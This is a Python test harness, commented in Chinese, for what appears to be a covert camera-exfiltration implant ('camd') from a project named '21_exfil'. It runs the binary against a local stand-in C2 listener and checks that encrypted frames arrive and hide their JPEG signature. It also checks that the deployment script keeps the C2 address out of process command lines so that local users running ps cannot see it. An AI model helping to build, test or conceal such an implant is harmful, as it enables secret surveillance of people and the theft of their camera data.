#!/usr/bin/env python3
"""摄像头链路回传 —— 正向 + 反向守卫。

正向(F1/F2)：camd 用 tcp:// 前缀的 sink，C2 真实收到字节、线上不含明文。
反向(R1)：   去掉 tcp:// 前缀（缺陷形态），C2 收 0 字节、且本地生成
             名为"地址:端口"的文件 —— 证明该前缀是回传能否成立的唯一分界。
静态(S1)：   onekey.sh 里 sink 必须是"单一产地"——所有使用点取 conf 的
            CAMD_SINK，不得各自拼装；定义处必须带 tcp:// 或 front:// 前缀。

R1 的存在意义：若没有它，仅凭"C2 收到字节"这个正向断言，在 sink 被误写成
文件路径时同样可能凑巧成立（例如 cwd 恰好可写）——那时守卫会假绿。
"""
import re
import os, re, socket, subprocess, sys, time, threading, hashlib, glob


def _default_name(tpl):
    m = re.search(r'^NAME="\$\{NAME:-([^}]+)\}"',
                  open(tpl, encoding="utf-8").read(), re.M)
    if not m:
        raise SystemExit("[FATAL] 无法从模板解析默认 NAME——"
                         "守卫会按旧名找落点，失配方向是假阴性（恒绿）")
    return m.group(1)



CAMD_SRC = "/data/workspace/dayanjing/agent_windows/build/linux/camd"
DEFN = _default_name(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "onekey.sh"))
CAMD = "/usr/local/bin/" + DEFN
TEMPLATE = "/data/workspace/dayanjing/21_exfil/onekey.sh"

received = {"n": 0, "buf": b"", "conn": 0}
fails = []


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def server(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", port))
    s.listen(8)
    while True:
        try:
            c, _ = s.accept()
        except OSError:
            return
        received["conn"] += 1
        while True:
            try:
                d = c.recv(65536)
            except OSError:
                break
            if not d:
                break
            received["n"] += len(d)
            received["buf"] += d
        c.close()


def reset():
    received["n"] = 0
    received["buf"] = b""
    received["conn"] = 0


def run(cmd, timeout=90):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        return -9, (e.stdout or ""), (e.stderr or "")


def check(cond, name, detail=""):
    if cond:
        print(f"[PASS] {name}" + (f"  {detail}" if detail else ""))
    else:
        print(f"[FAIL] {name}  {detail}")
        fails.append(name)


def clear_strays(port):
    for pat in (f"/tmp/127.0.0.1:{port}", f"/data/workspace/127.0.0.1:{port}"):
        if os.path.exists(pat):
            os.remove(pat)


def main():
    if not os.path.exists(CAMD):
        shutil_ok = run(f"cp {CAMD_SRC} {CAMD} && chmod 755 {CAMD}")
        if shutil_ok[0] != 0:
            print("[FATAL] camd 不可用"); sys.exit(2)

    key = hashlib.sha256(os.urandom(32)).hexdigest()[:64]
    cwd = "/data/workspace"

    # ---------- F1: tcp:// + C2 在线 ----------
    port = free_port()
    threading.Thread(target=server, args=(port,), daemon=True).start()
    time.sleep(0.5)
    reset()
    clear_strays(port)
    rc, out, _ = run(f"cd {cwd} && {CAMD} --sink tcp://127.0.0.1:{port} "
                     f"--backend mock --key {key} --batches 1 --frames 1 2>&1")
    time.sleep(1.0)
    magic = b"\xff\xd8\xff"
    check(rc == 0 and received["n"] > 0, "F1 tcp:// 前缀时 C2 真实收到字节",
          f"rc={rc} 连接={received['conn']} 实收={received['n']}")
    check(received["n"] > 0 and magic not in received["buf"],
          "F2 线上信元不含 JPEG 明文",
          f"字节值种类={len(set(received['buf']))}")

    # ---------- R1: 去掉 tcp:// 前缀（缺陷形态）----------
    port2 = free_port()   # 故意不监听
    reset()
    clear_strays(port2)
    rc2, out2, _ = run(f"cd {cwd} && {CAMD} --sink 127.0.0.1:{port2} "
                       f"--backend mock --key {key} --batches 1 --frames 1 2>&1")
    time.sleep(0.5)
    stray = [p for p in (f"{cwd}/127.0.0.1:{port2}", f"/tmp/127.0.0.1:{port2}")
             if os.path.exists(p)]
    check(received["n"] == 0, "R1 缺 tcp:// 前缀时 C2 实收 0 字节（回传断裂）",
          f"rc={rc2} 实收={received['n']}")
    check(bool(stray), "R2 缺前缀时数据落到名为'地址:端口'的文件（缺陷指纹）",
          f"stray={stray[:1]}")
    check(rc2 == 0, "R3 缺前缀时 camd 仍返回 0（故障被静默掩盖）", f"rc={rc2}")
    for p in stray:
        os.remove(p)

    # ---------- S1: 模板静态守卫 ----------
    s = open(TEMPLATE).read()
    #
    # 判据随重构更新：sink 已从"三处各自拼装"改为**单一产地**（conf 里的
    # CAMD_SINK，由 sink_lines 唯一生成，run.sh 与 verify_run 都消费它）。
    # 旧判据要求"三处 sink 均显式带 tcp:// 前缀"—— 重构后只剩定义处一处
    # 带前缀，旧判据必然失败。但**不能**把代码退回三处重复：当年 tcp://
    # 前缀缺陷正是"三处里漏掉两处"造成的，重复就是缺陷的温床。
    # 新判据改为守住真正的不变量：使用点不得自行拼装，定义点必须带 scheme。
    code = [l for l in s.split("\n") if l.strip() and not l.strip().startswith("#")]
    uses = [l for l in code if "--sink" in l]
    bad = []
    for l in uses:
        m = re.search(r'--sink\s+("?)([^"\s]+)\1', l)
        # 实参必须是 CAMD_SIND 变量本身；写死 tcp://$C2_ADDR 之类即失守。
        if not m or "CAMD_SINK" not in m.group(2):
            bad.append(l.strip()[:70])
    # 判据第三次更新：sink 已**完全退出命令行**——/proc/<pid>/cmdline 是
    # 0444 世界可读，任何本地用户 ps 一下即得 C2 地址。现在由 sink_lines
    # 写入 conf，run.sh 用 `set -a` 导出，camd 从 environ(0400) 读取。
    # 旧判据要求 uses 非空（"使用点必须取自 CAMD_SINK"），重构后 uses=0，
    # 旧判据必然失败——这是判据过期，不是产品缺陷，故不得退回三处拼装。
    # 新不变量更强也更可证伪：命令行出现任何 --sink 即失守。
    check(not uses,
          "S1 sink 不得出现在命令行（改由 CAMD_SINK 环境注入；cmdline 0444 世界可读）",
          f"使用点={len(uses)} 异常={[u.strip()[:70] for u in uses]}")
    # 只取 printf 行：verify_run 里还有一句 `CAMD_SINK=""`（读 conf 前的
    # 清空初始化），它不含 scheme 且本就不该含——算进来会让判据恒红。
    defs = [l for l in code if "CAMD_SINK=" in l and "printf" in l]
    check(bool(defs) and all(("tcp://" in d or "front://" in d) for d in defs),
          "S1b CAMD_SINK 定义处带 scheme 前缀", f"定义={[d.strip()[:60] for d in defs]}")
    # 必须查"调用点"而非"定义存在"：只删调用行时函数定义仍在，
    # 若判据是 `"validate_c2" in s` 会继续绿 —— 校验形同虚设却无人察觉。
    check("\n    validate_c2\n" in s,
          "S2 模板的 C2 校验被真正调用（非仅定义）")

    print("=" * 60)
    if fails:
        print(f"[FAIL] {len(fails)} 项未通过: {fails}")
        sys.exit(1)
    print("[PASS] 全部通过  EXIT=0")


if __name__ == "__main__":
    main()
